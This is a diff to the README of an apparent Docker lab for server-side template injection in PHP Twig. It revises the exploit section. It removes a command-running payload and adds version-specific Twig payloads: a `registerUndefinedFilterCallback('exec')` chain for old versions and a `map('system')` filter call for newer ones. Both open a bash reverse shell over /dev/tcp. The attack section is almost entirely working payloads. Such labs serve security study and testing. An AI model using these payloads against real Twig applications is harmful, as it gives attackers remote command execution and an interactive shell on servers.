@@ -1,10 +1,10 @@
-# PHP Twig 3.X, 2.X, 1.X
+# PHP Twig
 
 ## Installation
 
 ```sh
 $ docker run --rm -it ovotreeovo/php-twig
-# php /var/www/html/1.php "{{ [\"id\"]|map('system')|join(',') }}"
+# php /var/www/html/1.php "{{ <payload-here> }}"
 ```
 
 ## Vulnerable Source
@@ -29,8 +29,18 @@ echo $twig->render('index');
 
 ## Exploit
 
+### <= 1.19
+
 ```php
-["/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'"]|map('system')|join(',')
+_self.env.registerUndefinedFilterCallback('exec')
+_self.env.getFilter('/bin/bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"')
+```
+
+
+### >= 1.41, >= 2.10, 3.X
+
+```php
+['/bin/bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"']|map('system')|join(',')
 ```
 
 ## Reference
